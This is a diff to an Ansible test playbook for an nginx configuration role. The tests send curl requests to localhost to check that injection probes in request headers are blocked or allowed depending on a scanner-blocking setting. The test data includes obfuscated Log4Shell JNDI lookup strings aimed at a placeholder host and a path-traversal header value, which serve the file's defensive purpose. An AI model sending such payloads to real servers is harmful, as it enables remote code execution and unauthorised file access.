@@ -333,32 +333,40 @@
       changed_when: false
       failed_when: safe_scanner_response.rc not in [52, 56] or safe_scanner_response.stdout != '000'
 
-    - name: Test Log4Shell probe in Accept header to safe.local gets no response (blocked by default)
-      ansible.builtin.command: >
-        curl -s -o /dev/null -w '%{http_code}' -H 'Host: safe.local'
-        -H 'Accept: ${${a:-j}ndi:ldap://probe.example.com/a}'
-        http://127.0.0.1/
-      register: safe_log4shell_response
+    - name: Test injection probes in request headers to safe.local get no response (blocked by default)
+      ansible.builtin.command:
+        argv:
+          - curl
+          - -s
+          - -o
+          - /dev/null
+          - -w
+          - '%{http_code}'
+          - -H
+          - 'Host: safe.local'
+          - -H
+          - '{{ item }}'
+          - http://127.0.0.1/
+      loop:
+        - 'Accept: ${${a:-j}ndi:ldap://probe.example.com/a}'
+        - 'Accept: ../../../../etc/services'
+        - 'User-Agent: ${jndi:ldap://probe.example.com/a}'
+        - 'Content-Type: ${${a:-j}ndi:ldap://probe.example.com/a}'
+        - 'X-Forwarded-For: ${jndi:ldap://probe.example.com/a}'
+      register: safe_probe_response
       changed_when: false
-      failed_when: safe_log4shell_response.rc not in [52, 56] or safe_log4shell_response.stdout != '000'
+      failed_when: safe_probe_response.rc not in [52, 56] or safe_probe_response.stdout != '000'
 
-    - name: Test path traversal probe in Accept header to safe.local gets no response (blocked by default)
+    # A multipart boundary may contain "../", it must not be blocked
+    - name: Test multipart Content-Type with dots and slashes to safe.local works
       ansible.builtin.command: >
         curl -s -o /dev/null -w '%{http_code}' -H 'Host: safe.local'
-        -H 'Accept: ../../../../etc/services'
+        -H 'Content-Type: multipart/form-data; boundary="../a/b"'
+        -H 'X-Forwarded-For: 192.0.2.10, 198.51.100.20'
         http://127.0.0.1/
-      register: safe_traversal_response
+      register: safe_multipart_response
       changed_when: false
-      failed_when: safe_traversal_response.rc not in [52, 56] or safe_traversal_response.stdout != '000'
-
-    - name: Test Log4Shell probe in User-Agent header to safe.local gets no response (blocked by default)
-      ansible.builtin.command: >
-        curl -s -o /dev/null -w '%{http_code}' -H 'Host: safe.local'
-        -A '${jndi:ldap://probe.example.com/a}'
-        http://127.0.0.1/
-      register: safe_ua_probe_response
-      changed_when: false
-      failed_when: safe_ua_probe_response.rc not in [52, 56] or safe_ua_probe_response.stdout != '000'
+      failed_when: safe_multipart_response.stdout != '200'
 
     - name: Test browser Accept header to safe.local works
       ansible.builtin.command: >
@@ -405,14 +413,26 @@
       changed_when: false
       failed_when: open_scanner_response.stdout != '200'
 
-    - name: Test Log4Shell probe in Accept header to open.local works (block_security_scanners disabled)
-      ansible.builtin.command: >
-        curl -s -o /dev/null -w '%{http_code}' -H 'Host: open.local'
-        -H 'Accept: ${${a:-j}ndi:ldap://probe.example.com/a}'
-        http://127.0.0.1/
-      register: open_log4shell_response
+    - name: Test injection probes in request headers to open.local work (block_security_scanners disabled)
+      ansible.builtin.command:
+        argv:
+          - curl
+          - -s
+          - -o
+          - /dev/null
+          - -w
+          - '%{http_code}'
+          - -H
+          - 'Host: open.local'
+          - -H
+          - '{{ item }}'
+          - http://127.0.0.1/
+      loop:
+        - 'Accept: ${${a:-j}ndi:ldap://probe.example.com/a}'
+        - 'Content-Type: ${${a:-j}ndi:ldap://probe.example.com/a}'
+      register: open_probe_response
       changed_when: false
-      failed_when: open_log4shell_response.stdout != '200'
+      failed_when: open_probe_response.stdout != '200'
 
     # raw_actions tests (server-level raw nginx directives)
     - name: Check if raw_actions_test vhost exists
